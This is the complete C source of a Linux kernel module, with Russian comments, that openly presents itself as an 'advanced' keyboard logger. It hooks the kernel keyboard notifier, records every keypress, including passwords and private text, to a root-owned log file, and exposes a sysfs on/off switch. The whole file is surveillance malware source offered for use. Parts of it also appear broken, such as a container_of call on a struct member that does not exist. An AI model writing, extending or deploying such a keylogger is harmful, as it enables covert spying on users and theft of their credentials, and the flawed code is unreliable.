#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/spinlock.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/string.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kaiser Yury");
MODULE_DESCRIPTION("Advanced Kernel keyboard logger");
MODULE_VERSION("2.0");

#define MAX_BUFFER_SIZE     1024
#define TMP_BUFF_SIZE       32
#define LOG_FILE_PATH     "/var/log/kkey.log"

struct keyboard_logger {
    struct file* log_file;
    struct notifier_block keyboard_notifier;
    struct work_struct writer_task;

    char* keyboard_buffer;
    char* write_buffer;

    size_t buffer_offset;
    size_t buffer_len;
    loff_t file_off;

    char side_buffer[MAX_BUFFER_SIZE];
    char back_buffer[MAX_BUFFER_SIZE];

    spinlock_t buffer_lock;
    bool log_enabled;
    bool flush_on_enter;
};

static void write_log_task(struct work_struct* work);
static size_t keycode_to_us_string(int keycode, int shift, int altgr, char* buffer, size_t buff_size);
static void flush_buffer(struct keyboard_logger* klogger);

// --- Расширенная карта раскладки (US) ---
static const char* us_keymap[][3] = {
    [KEY_RESERVED] = {"\0", "\0", "\0"},
    [KEY_ESC] = {"_ESC_", "_ESC_", "_ESC_"},
    [KEY_1] = {"1", "!", "~"},
    [KEY_2] = {"2", "@", "¬"},
    [KEY_3] = {"3", "#", "£"},
    [KEY_4] = {"4", "$", "€"},
    [KEY_5] = {"5", "%", "∞"},
    [KEY_6] = {"6", "^", "§"},
    [KEY_7] = {"7", "&", "¶"},
    [KEY_8] = {"8", "*", "•"},
    [KEY_9] = {"9", "(", "ª"},
    [KEY_0] = {"0", ")", "º"},
    [KEY_MINUS] = {"-", "_", "–"},
    [KEY_EQUAL] = {"=", "+", "±"},
    [KEY_BACKSPACE] = {"_BACKSPACE_", "_BACKSPACE_", "_BACKSPACE_"},
    [KEY_TAB] = {"_TAB_", "_TAB_", "_TAB_"},
    [KEY_Q] = {"q", "Q", "Q"},
    [KEY_W] = {"w", "W", "W"},
    [KEY_E] = {"e", "E", "E"},
    [KEY_R] = {"r", "R", "R"},
    [KEY_T] = {"t", "T", "T"},
    [KEY_Y] = {"y", "Y", "Y"},
    [KEY_U] = {"u", "U", "U"},
    [KEY_I] = {"i", "I", "I"},
    [KEY_O] = {"o", "O", "O"},
    [KEY_P] = {"p", "P", "P"},
    [KEY_LEFTBRACE] = {"[", "{", "«"},
    [KEY_RIGHTBRACE] = {"]", "}", "»"},
    [KEY_ENTER] = {"\n", "\n", "\n"},
    [KEY_LEFTCTRL] = {"_LCTRL_", "_LCTRL_", "_LCTRL_"},
    [KEY_A] = {"a", "A", "A"},
    [KEY_S] = {"s", "S", "S"},
    [KEY_D] = {"d", "D", "D"},
    [KEY_F] = {"f", "F", "F"},
    [KEY_G] = {"g", "G", "G"},
    [KEY_H] = {"h", "H", "H"},
    [KEY_J] = {"j", "J", "J"},
    [KEY_K] = {"k", "K", "K"},
    [KEY_L] = {"l", "L", "L"},
    [KEY_SEMICOLON] = {";", ":", "°"},
    [KEY_APOSTROPHE] = {"'", "\"", "´"},
    [KEY_GRAVE] = {"`", "~", "`"},
    [KEY_LEFTSHIFT] = {"_LSHIFT_", "_LSHIFT_", "_LSHIFT_"},
    [KEY_BACKSLASH] = {"\\", "|", "\\"},
    [KEY_Z] = {"z", "Z", "Z"},
    [KEY_X] = {"x", "X", "X"},
    [KEY_C] = {"c", "C", "C"},
    [KEY_V] = {"v", "V", "V"},
    [KEY_B] = {"b", "B", "B"},
    [KEY_N] = {"n", "N", "N"},
    [KEY_M] = {"m", "M", "M"},
    [KEY_COMMA] = {",", "<", "‚"},
    [KEY_DOT] = {".", ">", "›"},
    [KEY_SLASH] = {"/", "?", "⁄"},
    [KEY_RIGHTSHIFT] = {"_RSHIFT_", "_RSHIFT_", "_RSHIFT_"},
    [KEY_KPASTERISK] = {"*", "*", "*"},
    [KEY_LEFTALT] = {"_LALT_", "_LALT_", "_LALT_"},
    [KEY_SPACE] = {" ", " ", " "},
    [KEY_CAPSLOCK] = {"_CAPS_", "_CAPS_", "_CAPS_"},
    [KEY_F1] = {"_F1_", "_F1_", "_F1_"},
    [KEY_F2] = {"_F2_", "_F2_", "_F2_"},
    [KEY_F3] = {"_F3_", "_F3_", "_F3_"},
    [KEY_F4] = {"_F4_", "_F4_", "_F4_"},
    [KEY_F5] = {"_F5_", "_F5_", "_F5_"},
    [KEY_F6] = {"_F6_", "_F6_", "_F6_"},
    [KEY_F7] = {"_F7_", "_F7_", "_F7_"},
    [KEY_F8] = {"_F8_", "_F8_", "_F8_"},
    [KEY_F9] = {"_F9_", "_F9_", "_F9_"},
    [KEY_F10] = {"_F10_", "_F10_", "_F10_"},
    [KEY_NUMLOCK] = {"_NUM_", "_NUM_", "_NUM_"},
    [KEY_SCROLLLOCK] = {"_SCROLL_", "_SCROLL_", "_SCROLL_"},
    [KEY_KP7] = {"_KPD7_", "_HOME_", "_HOME_"},
    [KEY_KP8] = {"_KPD8_", "_UP_", "_UP_"},
    [KEY_KP9] = {"_KPD9_", "_PGUP_", "_PGUP_"},
    [KEY_KPMINUS] = {"-", "-", "-"},
    [KEY_KP4] = {"_KPD4_", "_LEFT_", "_LEFT_"},
    [KEY_KP5] = {"_KPD5_", "_KPD5_", "_KPD5_"},
    [KEY_KP6] = {"_KPD6_", "_RIGHT_", "_RIGHT_"},
    [KEY_KPPLUS] = {"+", "+", "+"},
    [KEY_KP1] = {"_KPD1_", "_END_", "_END_"},
    [KEY_KP2] = {"_KPD2_", "_DOWN_", "_DOWN_"},
    [KEY_KP3] = {"_KPD3_", "_PGDN_", "_PGDN_"},
    [KEY_KP0] = {"_KPD0_", "_INS_", "_INS_"},
    [KEY_KPDOT] = {"_KPD._", "_DEL_", "_DEL_"},
    [KEY_F11] = {"_F11_", "_F11_", "_F11_"},
    [KEY_F12] = {"_F12_", "_F12_", "_F12_"},
    [KEY_KPENTER] = {"_KPENTER_", "_KPENTER_", "_KPENTER_"},
    [KEY_RIGHTCTRL] = {"_RCTRL_", "_RCTRL_", "_RCTRL_"},
    [KEY_KPSLASH] = {"/", "/", "/"},
    [KEY_RIGHTALT] = {"_RALT_", "_RALT_", "_RALT_"},
    [KEY_HOME] = {"_HOME_", "_HOME_", "_HOME_"},
    [KEY_UP] = {"_UP_", "_UP_", "_UP_"},
    [KEY_PAGEUP] = {"_PGUP_", "_PGUP_", "_PGUP_"},
    [KEY_LEFT] = {"_LEFT_", "_LEFT_", "_LEFT_"},
    [KEY_RIGHT] = {"_RIGHT_", "_RIGHT_", "_RIGHT_"},
    [KEY_END] = {"_END_", "_END_", "_END_"},
    [KEY_DOWN] = {"_DOWN_", "_DOWN_", "_DOWN_"},
    [KEY_PAGEDOWN] = {"_PGDN_", "_PGDN_", "_PGDN_"},
    [KEY_INSERT] = {"_INS_", "_INS_", "_INS_"},
    [KEY_DELETE] = {"_DEL_", "_DEL_", "_DEL_"},
    [KEY_PAUSE] = {"_PAUSE_", "_PAUSE_", "_PAUSE_"},
};

// --- Функция сброса буфера в задачу для записи ---
static void flush_buffer(struct keyboard_logger* klogger)
{
    char* tmp;
    unsigned long flags;

    if (!klogger->log_enabled || klogger->buffer_offset == 0)
        return;

    spin_lock_irqsave(&klogger->buffer_lock, flags);

    tmp = klogger->keyboard_buffer;
    klogger->keyboard_buffer = klogger->write_buffer;
    klogger->write_buffer = tmp;
    klogger->buffer_len = klogger->buffer_offset;
    klogger->buffer_offset = 0;

    spin_unlock_irqrestore(&klogger->buffer_lock, flags);

    schedule_work(&klogger->writer_task);

    // Очищаем новый буфер
    memset(klogger->keyboard_buffer, 0, MAX_BUFFER_SIZE);
}

// --- Функция преобразования код-клавиши в строку ---
static size_t keycode_to_us_string(int keycode, int shift, int altgr, char* buffer, size_t buff_size)
{
    const size_t keymap_size = ARRAY_SIZE(us_keymap);
    int modifier = 0; // 0 = normal, 1 = shift, 2 = altgr

    if (buff_size == 0 || !buffer)
        return 0;

    memset(buffer, 0, buff_size);

    if (keycode >= keymap_size || keycode < 0) {
        snprintf(buffer, buff_size, "_UNK_%d_", keycode);
        return strlen(buffer);
    }

    // Определяем модификатор
    if (altgr)
        modifier = 2;
    else if (shift)
        modifier = 1;

    // Проверяем границы массива
    if (modifier >= (int)ARRAY_SIZE(us_keymap[0])) {
        modifier = 0;
    }

    const char* key_str = us_keymap[keycode][modifier];
    if (!key_str) {
        snprintf(buffer, buff_size, "_KEY_%d_", keycode);
    }
    else {
        strncpy(buffer, key_str, buff_size - 1);
        buffer[buff_size - 1] = '\0';
    }

    return strlen(buffer);
}

// --- Callback-функция для перехвата событий клавиатуры ---
static int keyboard_callback(struct notifier_block* kblock, unsigned long action, void* data)
{
    struct keyboard_logger* klogger;
    struct keyboard_notifier_param* key_param;
    size_t keystr_len = 0;
    char tmp_buff[TMP_BUFF_SIZE];
    unsigned long flags;

    klogger = container_of(kblock, struct keyboard_logger, keyboard_notifier);

    if (!klogger->log_enabled)
        return NOTIFY_OK;

    key_param = (struct keyboard_notifier_param*)data;

    // Обрабатываем только нажатия клавиш
    if (!key_param->down)
        return NOTIFY_OK;

    keystr_len = keycode_to_us_string(key_param->value,
        key_param->shift,
        key_param->altgr,
        tmp_buff,
        TMP_BUFF_SIZE);

    if (keystr_len == 0)
        return NOTIFY_OK;

    // Обработка специальных клавиш
    if (tmp_buff[0] == '\n' && klogger->flush_on_enter) {
        flush_buffer(klogger);
        return NOTIFY_OK;
    }

    spin_lock_irqsave(&klogger->buffer_lock, flags);

    // Проверяем, достаточно ли места в буфере
    if ((klogger->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1) {
        spin_unlock_irqrestore(&klogger->buffer_lock, flags);
        flush_buffer(klogger);
        spin_lock_irqsave(&klogger->buffer_lock, flags);
    }

    // Копируем данные в буфер
    strncpy(klogger->keyboard_buffer + klogger->buffer_offset, tmp_buff, keystr_len);
    klogger->buffer_offset += keystr_len;

    spin_unlock_irqrestore(&klogger->buffer_lock, flags);

    // Авто-сброс при достижении 75% заполнения
    if (klogger->buffer_offset > (MAX_BUFFER_SIZE * 3 / 4)) {
        flush_buffer(klogger);
    }

    return NOTIFY_OK;
}

// --- Задача, выполняющая запись в файл ---
static void write_log_task(struct work_struct* work)
{
    struct keyboard_logger* klogger;
    ssize_t bytes_written;
    mm_segment_t old_fs;

    klogger = container_of(work, struct keyboard_logger, writer_task);

    if (!klogger->log_enabled || klogger->buffer_len == 0)
        return;

    // Сохраняем и меняем сегмент FS для kernel_write
    old_fs = get_fs();
    set_fs(KERNEL_DS);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
    bytes_written = kernel_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
#else
    bytes_written = vfs_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
#endif

    set_fs(old_fs);

    if (bytes_written < 0) {
        pr_err("kkey: Failed to write to log file, error %zd\n", bytes_written);
    }
    else if (bytes_written != klogger->buffer_len) {
        pr_warn("kkey: Partial write: %zd of %zu bytes\n", bytes_written, klogger->buffer_len);
    }

    // Очищаем буфер после записи
    memset(klogger->write_buffer, 0, klogger->buffer_len);
    klogger->buffer_len = 0;
}

// --- SysFS интерфейс ---
static ssize_t enabled_show(struct kobject* kobj, struct kobj_attribute* attr, char* buf)
{
    struct keyboard_logger* klogger = container_of(kobj, struct keyboard_logger, kobj);
    return scnprintf(buf, PAGE_SIZE, "%d\n", klogger->log_enabled);
}

static ssize_t enabled_store(struct kobject* kobj, struct kobj_attribute* attr,
    const char* buf, size_t count)
{
    struct keyboard_logger* klogger = container_of(kobj, struct keyboard_logger, kobj);
    int enabled;

    if (kstrtoint(buf, 10, &enabled))
        return -EINVAL;

    klogger->log_enabled = (enabled != 0);

    if (!klogger->log_enabled) {
        // При отключении сбрасываем буфер
        flush_buffer(klogger);
        cancel_work_sync(&klogger->writer_task);
    }

    return count;
}

static ssize_t buffer_info_show(struct kobject* kobj, struct kobj_attribute* attr, char* buf)
{
    struct keyboard_logger* klogger = container_of(kobj, struct keyboard_logger, kobj);
    unsigned long flags;
    size_t offset;

    spin_lock_irqsave(&klogger->buffer_lock, flags);
    offset = klogger->buffer_offset;
    spin_unlock_irqrestore(&klogger->buffer_lock, flags);

    return scnprintf(buf, PAGE_SIZE, "Buffer usage: %zu/%d bytes\n", offset, MAX_BUFFER_SIZE);
}

static struct kobj_attribute enabled_attribute =
__ATTR(enabled, 0664, enabled_show, enabled_store);

static struct kobj_attribute buffer_info_attribute =
__ATTR(buffer_info, 0444, buffer_info_show, NULL);

static struct attribute* kkey_attrs[] = {
    &enabled_attribute.attr,
    &buffer_info_attribute.attr,
    NULL,
};

static struct attribute_group kkey_attr_group = {
    .attrs = kkey_attrs,
};

static struct kobject* kkey_kobj;

static struct keyboard_logger* klogger;

// --- Функция инициализации модуля ---
static int __init k_key_logger_init(void)
{
    int err;

    printk(KERN_INFO "kkey: Initializing advanced keyboard logger\n");

    klogger = kzalloc(sizeof(struct keyboard_logger), GFP_KERNEL);
    if (!klogger) {
        pr_err("kkey: Unable to allocate memory\n");
        return -ENOMEM;
    }

    // Инициализация спинлока
    spin_lock_init(&klogger->buffer_lock);

    // Открываем файл для записи
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
    klogger->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_WRONLY | O_APPEND, 0600);
#else
    klogger->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_WRONLY | O_APPEND, S_IRUSR | S_IWUSR);
#endif

    if (IS_ERR(klogger->log_file)) {
        pr_err("kkey: Unable to create or open log file: %s, error %ld\n",
            LOG_FILE_PATH, PTR_ERR(klogger->log_file));
        err = PTR_ERR(klogger->log_file);
        kfree(klogger);
        return err;
    }

    // Инициализация буферов
    klogger->keyboard_buffer = klogger->side_buffer;
    klogger->write_buffer = klogger->back_buffer;
    klogger->buffer_offset = 0;
    klogger->buffer_len = 0;
    klogger->file_off = 0;
    klogger->log_enabled = true;
    klogger->flush_on_enter = true;

    memset(klogger->side_buffer, 0, MAX_BUFFER_SIZE);
    memset(klogger->back_buffer, 0, MAX_BUFFER_SIZE);

    // Регистрация обработчика клавиатуры
    klogger->keyboard_notifier.notifier_call = keyboard_callback;
    err = register_keyboard_notifier(&klogger->keyboard_notifier);
    if (err) {
        pr_err("kkey: Failed to register keyboard notifier\n");
        filp_close(klogger->log_file, NULL);
        kfree(klogger);
        return err;
    }

    // Инициализация workqueue
    INIT_WORK(&klogger->writer_task, write_log_task);

    // Создание SysFS интерфейса
    kkey_kobj = kobject_create_and_add("kkey", kernel_kobj);
    if (!kkey_kobj) {
        pr_err("kkey: Failed to create sysfs kobject\n");
        unregister_keyboard_notifier(&klogger->keyboard_notifier);
        filp_close(klogger->log_file, NULL);
        kfree(klogger);
        return -ENOMEM;
    }

    err = sysfs_create_group(kkey_kobj, &kkey_attr_group);
    if (err) {
        pr_err("kkey: Failed to create sysfs group\n");
        kobject_put(kkey_kobj);
        unregister_keyboard_notifier(&klogger->keyboard_notifier);
        filp_close(klogger->log_file, NULL);
        kfree(klogger);
        return err;
    }

    pr_info("kkey: Advanced keyboard logger initialized successfully\n");
    pr_info("kkey: Log file: %s\n", LOG_FILE_PATH);
    pr_info("kkey: SysFS interface: /sys/kernel/kkey/\n");

    return 0;
}

// --- Функция выгрузки модуля ---
static void __exit k_key_logger_exit(void)
{
    pr_info("kkey: Unloading module\n");

    if (klogger) {
        // Отключаем логирование
        klogger->log_enabled = false;

        // Сбрасываем оставшиеся данные
        flush_buffer(klogger);

        // Ожидаем завершения всех задач
        cancel_work_sync(&klogger->writer_task);

        // Удаляем SysFS
        if (kkey_kobj) {
            sysfs_remove_group(kkey_kobj, &kkey_attr_group);
            kobject_put(kkey_kobj);
        }

        // Отменяем регистрацию нотификатора
        unregister_keyboard_notifier(&klogger->keyboard_notifier);

        // Закрываем файл
        if (!IS_ERR(klogger->log_file)) {
            filp_close(klogger->log_file, NULL);
        }

        kfree(klogger);
    }

    pr_info("kkey: Module unloaded\n");
}

module_init(k_key_logger_init);
module_exit(k_key_logger_exit);